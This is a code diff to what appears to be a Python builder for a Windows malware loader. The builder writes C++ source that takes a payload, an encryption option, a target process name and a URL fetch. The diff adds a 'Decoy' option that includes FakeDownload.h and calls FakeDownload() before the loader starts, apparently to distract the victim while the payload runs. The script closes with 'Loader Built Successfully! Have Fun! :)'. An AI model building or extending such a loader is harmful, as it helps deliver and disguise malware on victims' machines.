@@ -4,7 +4,7 @@ from Cast.cli import *
 from Cast.local_load import *
 from Cast.encryptor import *
 
-def build (Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url):
+def build (Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
     f = open ("Build\\main.cpp", "a")
     f.write(f"""
 #include <iostream>
@@ -12,6 +12,11 @@ def build (Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url):
 #include <Windows.h>
 #include <stdio.h>
 #include <wininet.h>
+
+""")
+    if Decoy != "null":
+        f.write(f"""\n
+#include "../Spells/UtilitySpells/FakeDownload.h"
 #include "../Spells/UtilitySpells/FetchFromURL.h"
 """)   
     
@@ -25,10 +30,7 @@ def build (Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url):
         f.write(f"""\n
 #include "../Spells/{Enumeration}"
 """)
-    else:
-        pass
-
-
+        
     f.write(f"""\n
 #include "../Spells/{Loader}"
 """)
@@ -52,6 +54,13 @@ int main()
     HANDLE hThread;
     HANDLE* phThread = &hThread;
 
+    """)
+    if Decoy != "null":
+        f.write(f"""\n
+    FakeDownload();
+""")
+
+    f.write(f"""\n
     HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString");
 
     if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
@@ -205,6 +214,8 @@ def main():
 
     change_header_file(Enumeration, Loader, ApiMode)
 
+    Decoy = set_decoy()
+
     Path = input(f"""\nPath for the final build (Default .\\Build):
 
     >> """)
@@ -219,7 +230,7 @@ def main():
 
     Path = os.path.join(Path, Name)
 
-    if not build(Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url):
+    if not build(Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url, Decoy):
         print(f"\nLoader Built Successfully!\nAt {Path}\n\nHave Fun! :)")
     else:
         print(f"\nFailed to build loader :(")
